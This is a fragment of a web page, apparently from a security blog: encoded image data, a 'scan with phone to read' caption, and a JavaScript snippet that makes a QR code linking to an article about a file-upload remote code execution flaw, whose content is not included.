sHa9h9iEc9mifs+WQbNc7N9/1zs2JkPkwo/4KnVu4W8iq6dJ/5glsC4FstbZU5e3ruqrz0qrURcgcuQizXr1VEL2uq8yLpf1pOQNyjxVXF2HOq3dcnessB5lv/5jfFjKK1/XrnsDuLxfheHtuE+J7ZHW5qA7Jy/XhOR2Sg2Dvlx8hzD39DEc9owZz/+g9uu73gcyBYO+F6MD1wfD2Zl+7P7L6dvt59SFb7X7n5rsuh8yBYNftF+E4B9h6/9wDbP+TgwZw91bce4jmzhDmueadI6p31C/cLaSHL/6zT2D7pA7ZMgT7MSA6BLsvry1XySF5CH58fNxfufodq7dKHdInFytTJR+x9CpIb11XmanrKjkkB0H1ylTJV1iZqpUPx3Nh1qv/eofUU3ij2hZSGx4L9turc4+Zuobk6rqqMmOVNhYkP2bq2gwc+xDdXPWc1VlWv6NzYb4nhOuvEJKDoDnvA7OuX7gtpMhVr38C20IgW4OgR4NjDse6fSv0VaIvh8yTi6tc1ysPmQFBM88ipA+Cva/uUdV1OM6bq54qeUdIP3B9Drm92df2Sd1z1SbHWulm9DtCtq4O4RBUF8/mrXKQeYCR+09xNW8T/r0orQq4fx6B4L/2BpUZazOevBh76xrm+5S2qu2PrCfvdcX+4yewLcSNQbYJQe8P4RBUF3v/iptfIWQ+BJ1jHqLLRzQLyUBwzNS1ubquguNceVUQH4KlVUF4n1deFcSv6yqYeWm9toV04+KveQK7T+oeY7X1lQ6Ptw/HPsy680WID0HPB+HmCmHWzHaE5NSrdyx1SE5PXVzpMPeZEyG+cyAcuH7Kur3Z1/ZHltvr5+s6ZJvmuq8OyXV/xSF5mNF5z/SZhcywB8L1O8LsQ3jvl5/1m4PM6flHfFvIo9Dl/dwT2H0OWd3arYs9p96x5+Tm4LlXEcw5CHfOEUIy3lPsWXU4zut3hOSdB+EQ7Lr96p2Xfr1DfCpvgrufsmpLVf18kK3DMfb8isPcX/cayz61zruuXwjHs8urgtkvrerRzPKfLeeI9nUOOYf+iNc7ZHwab3C9WwhkexD0jG5ZVBdhzqt3fLYf5nkw8z63uLNFSI9crOxYkNyoPbp2jgjph2N0FsSXixAduD6H3N7sa/lTltvv54Vss+srDl/L9zmeQ4R5HoTDHu1xJiTTdX1RH5JXF+FY1+8Ic975PVd890dWiVe97glsP2W5NXF1JH3RXOfqoj7k1SLvvroIyUPwLF99ZkSYe9U7Vm9V1+Uwz4GZV+9R2b/Csed6h6ye0ov07b8hkG3Dc/jV80Lm+mqwH6JDsOs9ry9C+gClL2O/B3D/jaK66GC5qC5C+uUdYe1f75D+tF7Mt4W47TNcnRfmrUO481Z9+qK5ztU7mivsHuQMXZdDfAiq16wqiA5BfQiHoLpYvVVysbQqOaQfPnFbiKELX/sEdguBz23B5/XZMWvzVebqugoyo66r9CG6vCPMfvVWmYP4sEczlR9LHdKjpy5CfLlovqM+pA9m7L5cHOftFmLowtc8gW8vxO1CXhX929Bf6ZA+CJo761v51d89yGx1sbJHpd/RLGSe3Nyz3LwImQdcf5d1e7Ovb79D/H76ttU7Ql4NXZdDfAiqd4T43ndEiNd7Ooc5BzM3D8e6fkdI3jOtfHVzhX9tIQ6/8HtPYLeQ2tJRffU2kFdJ73N21+X6ojrM87pfOZgzEH6UrfyqIH0QNAePufcR7VshzPMqt1tIiVe97glsC4FsCx7j6qiQPv3VqwSSg2DPQXSY0bkQXf4MQnpgxn5vZ53p3YfMtb8jxO995iA+cP2UdXuzr+0d8mbn+t8e5x8AAAD//0UHhC8AAAAGSURBVAMA/UWM1KK3K7UAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/metasoft-business-sendfile-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 